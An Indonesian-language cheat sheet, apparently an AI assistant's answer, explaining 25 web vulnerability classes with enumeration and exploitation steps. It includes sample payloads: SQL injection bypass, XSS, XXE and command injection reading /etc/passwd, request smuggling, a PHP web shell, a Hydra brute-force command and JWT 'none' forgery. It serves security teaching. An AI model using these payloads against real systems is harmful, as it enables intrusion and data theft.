### **1. SQL Injection**

**Apa itu?**
SQL Injection adalah kerentanan di mana penyerang bisa menyisipkan atau "menyuntikkan" perintah SQL berbahaya ke dalam query yang dijalankan oleh aplikasi.

**Cara Enumerasi:**
- **Input Testing:** Coba masukkan karakter khusus seperti `' OR '1'='1` di field input (misalnya login).
- **Error Messages:** Perhatikan pesan error yang muncul, bisa memberi petunjuk tentang struktur database.
- **Automated Tools:** Gunakan alat seperti SQLmap untuk otomatis mendeteksi kerentanan.

**Cara Eksploitasi:**
- **Login Bypass:** Menggunakan payload seperti `' OR '1'='1` untuk melewati autentikasi.
- **Data Dumping:** Mengekstrak data sensitif seperti `UNION SELECT` untuk mengambil tabel dan kolom.
  
**Contoh Query:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```
**Eksploitasi:**
```sql
' OR '1'='1
```
Menjadi:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

---

### **2. Cross-Site Scripting (XSS)**

**Apa itu?**
XSS memungkinkan penyerang menyuntikkan skrip berbahaya ke dalam halaman web yang dilihat oleh pengguna lain.

**Cara Enumerasi:**
- **Input Fields:** Coba masukkan skrip sederhana seperti `<script>alert('XSS')</script>` di form input.
- **URL Parameters:** Manipulasi parameter URL untuk melihat apakah skrip dijalankan.
- **Automated Scanners:** Gunakan alat seperti Burp Suite atau OWASP ZAP.

**Cara Eksploitasi:**
- **Reflected XSS:** Skrip dieksekusi langsung dari input pengguna tanpa disanitasi.
- **Stored XSS:** Skrip disimpan di database dan dieksekusi setiap kali halaman dimuat.
  
**Contoh Payload:**
```html
<script>alert('XSS')</script>
```

---

### **3. Cross-Site Request Forgery (CSRF)**

**Apa itu?**
CSRF membuat pengguna yang sudah terautentikasi melakukan tindakan yang tidak diinginkan di aplikasi web.

**Cara Enumerasi:**
- **Token Absence:** Cek apakah aplikasi menggunakan token CSRF di form atau header.
- **SameSite Cookies:** Periksa pengaturan cookie untuk atribut `SameSite`.

**Cara Eksploitasi:**
- **Crafted Requests:** Buat halaman web lain yang secara otomatis mengirimkan permintaan ke aplikasi target saat pengguna mengunjungi halaman tersebut.
  
**Contoh:**
```html
<img src="https://target.com/transfer?amount=1000&to=attacker" />
```

---

### **4. Clickjacking**

**Apa itu?**
Clickjacking mengelabui pengguna untuk mengklik sesuatu yang tidak mereka sadari, seringkali melalui frame transparan.

**Cara Enumerasi:**
- **Frame Busting:** Cek apakah aplikasi menggunakan header `X-Frame-Options` atau CSP untuk mencegah framing.
- **Visual Testing:** Coba muat aplikasi dalam iframe dan lihat apakah diblokir.

**Cara Eksploitasi:**
- **Overlay Frames:** Tempatkan iframe transparan di atas elemen yang bisa diklik untuk mencuri klik pengguna.
  
**Contoh HTML:**
```html
<iframe src="https://target.com" style="opacity:0; position:absolute; top:0; left:0;"></iframe>
```

---

### **5. DOM-based Vulnerabilities**

**Apa itu?**
Kerentanan ini terjadi ketika skrip sisi klien memanipulasi DOM berdasarkan input pengguna tanpa sanitasi yang benar.

**Cara Enumerasi:**
- **Review JavaScript:** Lihat kode JavaScript untuk manipulasi DOM yang bergantung pada input pengguna.
- **Dynamic Content:** Coba manipulasi parameter URL atau input lain yang mempengaruhi DOM.

**Cara Eksploitasi:**
- **DOM XSS:** Suntikkan skrip melalui manipulasi DOM, misalnya melalui URL.
  
**Contoh Payload:**
```javascript
http://example.com/page#<script>alert('XSS')</script>
```

---

### **6. Cross-Origin Resource Sharing (CORS)**

**Apa itu?**
CORS mengontrol bagaimana sumber daya diakses dari domain berbeda. Konfigurasi yang salah bisa memungkinkan penyerang mengakses data sensitif.

**Cara Enumerasi:**
- **Check CORS Headers:** Gunakan alat seperti `curl` atau browser dev tools untuk melihat header CORS.
- **Allowed Origins:** Identifikasi origin yang diizinkan.

**Cara Eksploitasi:**
- **Malicious Origin:** Set origin ke yang diizinkan dan buat permintaan untuk mengakses data.
  
**Contoh Header:**
```http
Access-Control-Allow-Origin: *
```

---

### **7. XML External Entity (XXE) Injection**

**Apa itu?**
XXE memungkinkan penyerang menyisipkan entitas eksternal ke dalam dokumen XML, bisa digunakan untuk membaca file lokal atau melakukan serangan denial of service.

**Cara Enumerasi:**
- **Upload XML Files:** Coba unggah atau kirim XML dengan entitas eksternal.
- **Error Messages:** Perhatikan pesan error yang mengindikasikan parsing XML gagal.

**Cara Eksploitasi:**
- **File Disclosure:** Menggunakan entitas eksternal untuk membaca file di server.
  
**Contoh Payload:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

---

### **8. Server-Side Request Forgery (SSRF)**

**Apa itu?**
SSRF memungkinkan penyerang membuat server melakukan permintaan HTTP ke URL yang dipilih, bisa digunakan untuk mengakses layanan internal.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang menerima URL atau alamat IP.
- **Server Behavior:** Coba kirimkan berbagai URL dan lihat responsnya.

**Cara Eksploitasi:**
- **Internal Network Access:** Arahkan server untuk mengakses URL internal seperti `http://localhost/admin`.
  
**Contoh Payload:**
```
http://localhost:8080/admin
```

---

### **9. HTTP Request Smuggling**

**Apa itu?**
HTTP Request Smuggling memanipulasi cara server memproses permintaan HTTP, bisa menyebabkan bypass security controls atau mengakses data pengguna lain.

**Cara Enumerasi:**
- **Different Intermediaries:** Cek bagaimana server dan proxy menangani header HTTP seperti `Transfer-Encoding` dan `Content-Length`.
- **Payload Testing:** Kirimkan permintaan dengan konflik header dan lihat bagaimana diproses.

**Cara Eksploitasi:**
- **Session Hijacking:** Manipulasi permintaan untuk mengikat sesi pengguna ke sesi penyerang.
  
**Contoh Payload:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

---

### **10. OS Command Injection**

**Apa itu?**
OS Command Injection memungkinkan penyerang menjalankan perintah sistem operasi pada server melalui input aplikasi.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang diteruskan ke perintah shell, seperti field ping atau traceroute.
- **Special Characters:** Coba masukkan karakter seperti `;`, `&&`, atau `|` untuk memisahkan perintah.

**Cara Eksploitasi:**
- **Command Execution:** Jalankan perintah berbahaya seperti `rm -rf /`.
  
**Contoh Payload:**
```
127.0.0.1; cat /etc/passwd
```

---

### **11. Server-Side Template Injection (SSTI)**

**Apa itu?**
SSTI memungkinkan penyerang menyuntikkan kode berbahaya ke dalam template engine server, bisa digunakan untuk eksekusi kode atau akses data.

**Cara Enumerasi:**
- **Template Syntax:** Cari input yang diproses oleh template engine seperti Jinja2, Twig, atau Handlebars.
- **Error Messages:** Perhatikan pesan error yang mengindikasikan interpretasi template.

**Cara Eksploitasi:**
- **Code Execution:** Masukkan payload yang dieksekusi oleh template engine.
  
**Contoh Payload (Jinja2):**
```
{{ config }}
```

---

### **12. Directory Traversal**

**Apa itu?**
Directory Traversal memungkinkan penyerang mengakses file di server yang seharusnya tidak dapat diakses dengan menggunakan path traversal (`../`).

**Cara Enumerasi:**
- **File Access:** Coba akses file dengan path traversal, seperti `../../etc/passwd`.
- **Input Fields:** Cari input yang menerima path file atau direktori.

**Cara Eksploitasi:**
- **File Disclosure:** Akses file sensitif seperti `../../../../etc/passwd`.
  
**Contoh URL:**
```
http://example.com/download?file=../../../../etc/passwd
```

---

### **13. Access Control Vulnerabilities**

**Apa itu?**
Kerentanan kontrol akses terjadi ketika aplikasi tidak secara benar membatasi akses pengguna ke sumber daya atau fungsi tertentu.

**Cara Enumerasi:**
- **Role Testing:** Coba akses URL atau fungsi yang seharusnya hanya untuk admin sebagai pengguna biasa.
- **Parameter Manipulation:** Ubah parameter seperti `user_id` untuk mengakses data pengguna lain.

**Cara Eksploitasi:**
- **Privilege Escalation:** Tingkatkan hak akses dari pengguna biasa menjadi admin.
  
**Contoh:**
Mengubah URL dari:
```
http://example.com/profile?user_id=123
```
Menjadi:
```
http://example.com/profile?user_id=1
```
Untuk mengakses profil admin.

---

### **14. Authentication**

**Apa itu?**
Kerentanan autentikasi terjadi ketika mekanisme login tidak aman, memungkinkan penyerang untuk masuk tanpa kredensial yang valid.

**Cara Enumerasi:**
- **Brute Force:** Coba banyak kombinasi username dan password.
- **Credential Stuffing:** Gunakan kredensial bocor dari situs lain.
- **Default Credentials:** Cek apakah aplikasi menggunakan kredensial default seperti `admin/admin`.

**Cara Eksploitasi:**
- **Session Hijacking:** Ambil sesi pengguna yang sah melalui pencurian cookie atau token.
  
**Contoh Payload:**
Gunakan tool seperti Hydra untuk brute force:
```
hydra -l admin -P passwords.txt http-get://example.com/login
```

---

### **15. WebSockets**

**Apa itu?**
WebSockets memungkinkan komunikasi dua arah antara klien dan server. Kerentanan bisa terjadi jika handshake atau komunikasi tidak aman.

**Cara Enumerasi:**
- **WebSocket Tools:** Gunakan browser dev tools atau alat seperti `wscat` untuk menguji koneksi WebSocket.
- **Handshake Testing:** Coba manipulasi header handshake untuk melihat respons server.

**Cara Eksploitasi:**
- **Hijack Connection:** Manipulasi pesan WebSocket untuk mencuri data atau mengirim perintah berbahaya.
  
**Contoh Payload:**
```json
{
  "type": "command",
  "data": "shutdown"
}
```

---

### **16. Web Cache Poisoning**

**Apa itu?**
Web Cache Poisoning memungkinkan penyerang menyuntikkan konten berbahaya ke cache web, sehingga pengguna lain menerima konten yang dimanipulasi.

**Cara Enumerasi:**
- **Cache Headers:** Cek header cache seperti `Cache-Control` dan `Vary`.
- **Parameter Testing:** Uji berbagai parameter URL untuk melihat apakah cache dipengaruhi.

**Cara Eksploitasi:**
- **Inject Malicious Content:** Kirimkan permintaan dengan payload berbahaya yang disimpan di cache.
  
**Contoh Payload:**
```http
GET /search?q=<script>alert('Poison')</script> HTTP/1.1
Host: example.com
```

---

### **17. Insecure Deserialization**

**Apa itu?**
Insecure Deserialization terjadi ketika aplikasi menerima data terserialisasi yang tidak terpercaya dan mendeserialize tanpa validasi, memungkinkan eksekusi kode berbahaya.

**Cara Enumerasi:**
- **Input Fields:** Cari input yang menerima data serialized seperti JSON atau XML.
- **Testing Payloads:** Kirimkan objek serialized dengan payload berbahaya.

**Cara Eksploitasi:**
- **Remote Code Execution:** Modifikasi data serialized untuk menyisipkan perintah berbahaya.
  
**Contoh Payload (PHP Serialized Object):**
```php
O:4:"User":1:{s:4:"name";s:11:"<script>alert(1)</script>";}
```

---

### **18. Information Disclosure**

**Apa itu?**
Information Disclosure terjadi ketika aplikasi secara tidak sengaja mengungkapkan informasi sensitif seperti stack traces, data pengguna, atau konfigurasi server.

**Cara Enumerasi:**
- **Error Messages:** Coba input yang salah dan lihat apakah pesan error mengungkapkan detail teknis.
- **Endpoint Testing:** Akses endpoint yang mungkin mengembalikan informasi sensitif.

**Cara Eksploitasi:**
- **Gather Sensitive Data:** Gunakan informasi yang diungkap untuk melanjutkan serangan, seperti mengumpulkan struktur database.
  
**Contoh:**
Pesan error yang mengandung path file:
```
Error: File not found: /var/www/html/config.php on line 42
```

---

### **19. Business Logic Vulnerabilities**

**Apa itu?**
Kerentanan ini terjadi ketika logika bisnis aplikasi tidak diimplementasikan dengan benar, memungkinkan penyerang untuk melakukan tindakan yang tidak diinginkan.

**Cara Enumerasi:**
- **Workflow Testing:** Uji alur bisnis aplikasi untuk menemukan celah, seperti double-spending dalam sistem pembayaran.
- **Edge Cases:** Coba skenario ekstrem atau tidak biasa dalam penggunaan aplikasi.

**Cara Eksploitasi:**
- **Authentication Bypass:** Manipulasi alur bisnis untuk melewati autentikasi atau otorisasi.
  
**Contoh:**
Menggunakan state machine yang cacat untuk melewati autentikasi:
```
State A -> State B (bypass) -> State C (authenticated)
```

---

### **20. HTTP Host Header Attacks**

**Apa itu?**
HTTP Host Header Attacks memanipulasi header `Host` dalam permintaan HTTP untuk tujuan seperti cache poisoning, redirecting, atau bypassing akses kontrol.

**Cara Enumerasi:**
- **Header Manipulation:** Uji berbagai nilai header `Host` dan lihat bagaimana server merespons.
- **Check Application Behavior:** Periksa apakah aplikasi menggunakan nilai Host untuk logika penting.

**Cara Eksploitasi:**
- **Cache Poisoning:** Set Host ke domain penyerang untuk menginjeksi konten berbahaya ke cache.
  
**Contoh Payload:**
```http
GET / HTTP/1.1
Host: attacker.com
```

---

### **21. OAuth Authentication**

**Apa itu?**
OAuth adalah protokol otentikasi yang memungkinkan aplikasi pihak ketiga mengakses sumber daya pengguna. Kerentanan bisa terjadi jika implementasi OAuth tidak aman.

**Cara Enumerasi:**
- **Redirect URIs:** Cek apakah aplikasi membatasi redirect URI dengan benar.
- **Token Handling:** Periksa cara aplikasi menyimpan dan mengelola token akses.

**Cara Eksploitasi:**
- **Redirect URI Manipulation:** Arahkan pengguna ke aplikasi penyerang untuk mencuri token akses.
  
**Contoh Payload:**
```
https://oauthprovider.com/auth?client_id=attacker&redirect_uri=https://attacker.com/callback&response_type=token
```

---

### **22. File Upload Vulnerabilities**

**Apa itu?**
Kerentanan pada upload file terjadi ketika aplikasi tidak membatasi tipe file yang diunggah atau tidak memeriksa konten file dengan benar, memungkinkan penyerang mengunggah file berbahaya.

**Cara Enumerasi:**
- **Allowed File Types:** Cek jenis file yang diizinkan untuk diunggah.
- **Filename Testing:** Coba unggah file dengan ekstensi ganda atau skrip, seperti `shell.php.jpg`.

**Cara Eksploitasi:**
- **Web Shell Upload:** Unggah file berbahaya yang bisa dieksekusi di server.
  
**Contoh Payload:**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Simpan sebagai `shell.php`

---

### **23. JSON Web Token (JWT) Vulnerabilities**

**Apa itu?**
JWT digunakan untuk otentikasi dan transfer data. Kerentanan bisa terjadi jika token tidak diverifikasi dengan benar atau menggunakan algoritma lemah.

**Cara Enumerasi:**
- **Token Inspection:** Decode token JWT dan periksa payload serta header.
- **Algorithm Testing:** Coba ganti algoritma menjadi `none` atau `HS256` jika server tidak memeriksa dengan benar.

**Cara Eksploitasi:**
- **Token Manipulation:** Ubah payload untuk mendapatkan hak akses lebih tinggi.
  
**Contoh Payload:**
Header asli:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Manipulasi menjadi:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

---

### **24. Essential Skills**

**Apa itu?**
Ini lebih ke keterampilan dasar yang penting dalam penetration testing, seperti kemampuan scanning, analyzing, dan menggunakan tools.

**Cara Enumerasi:**
- **Tool Proficiency:** Kuasai alat seperti Nmap, Burp Suite, Metasploit.
- **Knowledge Base:** Pahami konsep dasar keamanan siber dan teknik pengujian penetrasi.

**Cara Eksploitasi:**
- **Comprehensive Testing:** Gunakan keterampilan ini untuk melakukan pengujian menyeluruh dan menemukan berbagai kerentanan.
  
**Contoh Skills:**
- **Scanning:** Gunakan Nmap untuk pemindaian port.
- **Intercepting:** Gunakan Burp Suite untuk intercept dan modify requests.

---

### **25. Prototype Pollution**

**Apa itu?**
Prototype Pollution memungkinkan penyerang memodifikasi prototype objek di JavaScript, yang bisa menyebabkan perubahan perilaku aplikasi.

**Cara Enumerasi:**
- **Input Testing:** Coba masukkan parameter seperti `__proto__` atau `constructor` di input yang diteruskan ke objek JavaScript.
- **Code Review:** Lihat bagaimana aplikasi memproses dan menggabungkan objek.

**Cara Eksploitasi:**
- **Modify Behavior:** Ubah properti prototype untuk mengubah logika aplikasi, misalnya, bypass autentikasi.
  
**Contoh Payload:**
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```


Jika ada kerentanan lain yang perlu dijelaskan atau butuh penjelasan lebih mendalam, jangan ragu untuk bertanya lagi!
